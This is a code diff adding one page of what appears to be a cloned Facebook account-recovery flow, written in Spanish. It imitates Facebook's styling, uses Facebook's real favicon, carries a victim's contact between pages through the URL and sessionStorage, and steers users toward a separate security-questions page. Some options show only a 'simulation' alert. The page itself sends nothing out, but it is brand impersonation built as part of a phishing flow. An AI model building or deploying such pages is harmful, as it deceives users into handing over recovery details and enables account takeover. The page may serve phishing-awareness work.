@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recuperar cuenta • Facebook</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico">
+    <style>
+        /* Estilos similares a recovery.html, omitidos por brevedad */
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family:Helvetica,Arial; background:#f0f2f5; min-height:100vh; display:flex; flex-direction:column; }
+        .header { background:white; padding:12px 20px; box-shadow:0 1px 3px rgba(0,0,0,0.1); display:flex; align-items:center; gap:12px; }
+        .fb-logo-small { width:40px; height:40px; background:#1877f2; border-radius:50%; display:flex; align-items:center; justify-content:center; color:white; font-size:24px; font-weight:bold; }
+        .main { flex:1; display:flex; align-items:center; justify-content:center; padding:20px; }
+        .card { background:white; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.1); max-width:500px; width:100%; padding:24px; }
+        .option { border:1px solid #dadde1; border-radius:6px; padding:16px; margin-bottom:12px; cursor:pointer; display:flex; align-items:center; gap:16px; }
+        .option.selected { border:2px solid #1877f2; background:#e7f3ff; }
+        .actions { display:flex; justify-content:space-between; margin-top:24px; padding-top:16px; border-top:1px solid #dadde1; }
+        .btn { padding:10px 20px; border-radius:6px; font-weight:600; cursor:pointer; }
+        .btn-back { background:none; border:none; color:#1877f2; }
+        .btn-continue { background:#1877f2; color:white; border:none; }
+        .btn-continue:disabled { background:#e4e6eb; color:#bcc0c4; cursor:not-allowed; }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="fb-logo-small">f</div>
+        <div>Recuperar cuenta</div>
+    </header>
+    <main class="main">
+        <div class="card">
+            <h2>Elige un método de recuperación</h2>
+            <div id="accountInfo" style="background:#f0f2f5; padding:12px; border-radius:8px; margin:16px 0; display:flex; gap:12px;">
+                <div style="width:50px; height:50px; background:#1877f2; border-radius:50%; display:flex; align-items:center; justify-content:center; color:white; font-size:20px;" id="avatarLetter">U</div>
+                <div><div style="font-weight:600;">Usuario de Facebook</div><div id="contactDisplay">c****@g****.com</div></div>
+            </div>
+            <form id="methodForm">
+                <div class="option" data-method="email" onclick="selectMethod('email')">
+                    <input type="radio" name="method" value="email" id="radioEmail">
+                    <div><strong>Enviar código por correo electrónico</strong><br><span id="emailDesc">c****@g****.com</span></div>
+                </div>
+                <div class="option" data-method="sms" onclick="selectMethod('sms')">
+                    <input type="radio" name="method" value="sms" id="radioSMS">
+                    <div><strong>Enviar código por SMS</strong><br><span id="smsDesc">+34 *** *** 123</span></div>
+                </div>
+                <div class="option" data-method="security" onclick="selectMethod('security')">
+                    <input type="radio" name="method" value="security" id="radioSecurity">
+                    <div><strong>Responder preguntas de seguridad</strong><br>Responde las preguntas que configuraste</div>
+                </div>
+                <div class="actions">
+                    <button type="button" class="btn btn-back" onclick="history.back()">Atrás</button>
+                    <button type="submit" class="btn btn-continue" id="continueBtn" disabled>Continuar</button>
+                </div>
+            </form>
+        </div>
+    </main>
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const contact = params.get('contact') || sessionStorage.getItem('fb_recovery_contact') || 'usuario@ejemplo.com';
+        function maskContact(c) {
+            if (c.includes('@')) {
+                let [name,domain] = c.split('@');
+                return name.substring(0,1)+'****'+name.slice(-1)+'@'+domain;
+            } else {
+                return c.slice(0,6)+'***'+c.slice(-3);
+            }
+        }
+        document.getElementById('contactDisplay').textContent = maskContact(contact);
+        document.getElementById('avatarLetter').textContent = contact.charAt(0).toUpperCase();
+        if (contact.includes('@')) {
+            document.getElementById('emailDesc').textContent = 'Enviar a: ' + maskContact(contact);
+            document.getElementById('smsDesc').textContent = 'Enviar al número asociado';
+        } else {
+            document.getElementById('smsDesc').textContent = 'Enviar a: ' + maskContact(contact);
+            document.getElementById('emailDesc').textContent = 'Enviar al correo asociado';
+        }
+        let selected = null;
+        function selectMethod(m) {
+            selected = m;
+            document.querySelectorAll('.option').forEach(o=>o.classList.remove('selected'));
+            event.currentTarget.classList.add('selected');
+            document.getElementById('continueBtn').disabled = false;
+        }
+        document.getElementById('methodForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            if (!selected) return;
+            sessionStorage.setItem('fb_recovery_method', selected);
+            if (selected === 'security') {
+                window.location.href = `recovery_questions.html?contact=${encodeURIComponent(contact)}`;
+            } else {
+                alert('Simulación: Se enviaría código a ' + contact + ' (no implementado)');
+                // Redirigir a página de código (opcional)
+            }
+        });
+    </script>
+</body>
+</html>
